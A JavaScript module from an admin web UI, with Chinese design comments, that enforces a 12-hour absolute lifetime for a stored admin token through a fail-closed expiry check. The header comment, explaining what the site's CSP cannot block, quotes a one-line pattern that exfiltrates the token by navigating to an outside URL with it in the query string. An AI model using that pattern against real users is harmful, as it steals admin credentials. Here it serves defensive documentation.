/**
 * 会话绝对上限的**取值决策**。
 *
 * localStorage 里放的是**原始的 `ADMIN_TOKEN`**，无过期、无登出、产品内无撤销路径
 *（撤销的唯一方式是改 secret 重新部署 / 重建容器，见设计文档 §8.1 规则 2）。
 * 上限管不了「口令已经被偷走」，它管的是**这份 localStorage 值还能被继续用多久**：
 * 一台被别人摸过的运维机器，可用期从「永远」压到「最多 12 小时」。
 *
 * ⚠️ **明说做不到的那一半**：CSP 的 `connect-src 'self'` 挡得住把口令 fetch 出去，
 * `form-action 'none'` 挡得住表单外传，**但挡不住 `location.href = "https://…?k=" + token`
 * 这种导航式外传**——CSP 已经没有可用的指令拦它（`navigate-to` 被规范移除了）。
 * 真正的解法是服务端签发可撤销的派生令牌，那要动「ADMIN_TOKEN 只从环境变量读」
 * 这条设计约束，登记 P3c。这段话同时写进了五语言 DEPLOY.md，不只留在注释里。
 *
 * ⚠️ **为什么这个决策在 `js/pure/` 而不是 `js/app.js` 里**（这一条是对计划的订正）：
 * 计划写的是「`SESSION_MAX_AGE_MS` 与 `sessionExpired()` 碰 localStorage 与 Date，
 * 在 node 环境里 import 就会炸 ⇒ 只由人工冒烟覆盖」。前半句对**读取**成立，
 * 对**判定**不成立：把「存下的时刻」与「现在」都变成参数之后，判定本身是纯函数
 *（这正是 admin-ui/README.md 硬规则 1 要求的形态）。碰浏览器全局的那一小段留在
 * `app.js` 里，由冒烟清单第 15/16 条覆盖；判定这一半在这里，由
 * `tests/ui/session.test.ts` 覆盖。
 *
 * 这个目录下的文件受三条硬规则约束，规则全文见 admin-ui/README.md。
 */

/** 会话绝对上限：**12 小时**。理由见上。 */
export const SESSION_MAX_AGE_MS = 12 * 3600_000;

/**
 * 这份存下来的口令是不是已经到达绝对上限，该要求重新输入了。
 *
 * `savedAt` 是写入口令那一刻的毫秒时间戳，`now` 是当前毫秒时间戳。两个都从参数进，
 * 因此这个判定与浏览器全局无关，可以直接在 node 里跑。
 *
 * **一律 fail closed**：拿不到有效的时刻就当成过期。少数几种情况值得点名——
 *
 * · `savedAt` 不是有限数 / ≤ 0：旧版本存的（那时还没有这个时刻键），或者存储被人
 *   改花了。按过期处理，代价只是多输一次口令。
 * · `now` 不是有限数：不该发生，但如果发生了，`now - savedAt` 会是 NaN，
 *   而 `NaN < 0` 与 `NaN >= 上限` **都是 false** ⇒ 不显式挡住的话结论会变成
 *   「没过期」，方向正好反了。这是一条 fail open 的缝，所以单独挡一次。
 * · `age < 0`（时钟回拨）：**按过期处理**。这条与后端三处「回拨立刻恢复」方向
 *   **相反**是刻意的：那三处回拨的代价是多刷新一次，这里回拨的代价是一份凭据多活一阵子。
 */
export function sessionExpired(savedAt, now) {
  if (!Number.isFinite(savedAt) || savedAt <= 0) return true;
  if (!Number.isFinite(now)) return true;
  const age = now - savedAt;
  return age < 0 || age >= SESSION_MAX_AGE_MS;
}
